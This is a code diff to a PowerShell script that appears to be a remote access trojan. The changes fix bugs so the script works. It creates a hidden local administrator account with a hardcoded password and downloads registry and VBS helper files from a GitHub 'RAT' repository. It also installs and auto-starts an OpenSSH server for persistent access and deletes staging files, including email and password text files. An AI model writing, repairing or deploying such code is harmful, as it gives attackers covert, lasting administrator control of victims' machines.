@@ -16,7 +16,7 @@ function create_account {
     begin {
     }
     process {
-        New-LocalUser "$uname" -password "$pword" -FullName "$uname" -Description "Temporary Local Admin"
+        New-LocalUser "$uname" -Password $pword -FullName "$uname" -Description "Temporary Local Admin"
         Write-Verbose "$uname local user created"
         Add-LocalGroupMember -Group "Administrators" -Member "$uname"
         Write-Verbose "$uname added to the local administrator group"
@@ -29,7 +29,7 @@ function create_account {
 $uname = "petrosrat"
 $password = "PetrosRAT123"   # he uses random password with the function above  $password = random_text
 $pword = (ConvertTo-SecureString $password -AsPlainText -Force)
-create_account (-uname $uname -pword $pword)
+create_account -uname $uname -pword $pword
 
 # variables
 $wd = random_text
@@ -62,7 +62,7 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/he
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/confirm-reg.vbs -OutFile "confirm-reg.vbs"
 
 # enabling persistent ssh
-Add-WindowsCapability -Online -Name OpeSSH.Server~~~~0.0.1.0
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -name sshd -StartupType 'Automatic'
 
@@ -83,5 +83,7 @@ Remove-Item $configfile
 Remove-Item email.txt
 Remove-Item pass.txt
 Remove-Item stage2.ps1
-Remove-Item hide-user.reg
-Remove-Item confirm-reg.vbs
+
+# I Have to add the location where to delete these (cd)
+# Remove-Item hide-user.reg
+# Remove-Item confirm-reg.vbs
